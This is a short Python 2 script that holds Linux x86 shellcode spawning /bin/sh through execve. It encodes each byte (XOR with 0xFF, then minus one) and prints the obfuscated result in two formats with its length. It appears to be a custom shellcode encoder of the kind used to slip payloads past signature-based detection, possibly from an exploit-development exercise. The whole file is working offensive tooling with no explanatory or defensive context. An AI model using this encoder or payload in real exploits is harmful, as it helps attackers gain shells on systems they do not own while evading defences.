#!/usr/bin/python

shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80")


encoded = ""
encoded2 = ""

for x in bytearray(shellcode) :
        enc1 = x ^ 0xFF
        enc2 = enc1 - 0x1
        encoded += '\\x'
        encoded += '%02x' %enc2

        encoded2 += '0x'
        encoded2 += '%02x,' %enc2
        
print encoded
print "\n"
print encoded2
print 'Shellcode lenght: %d' % len(bytearray(shellcode))
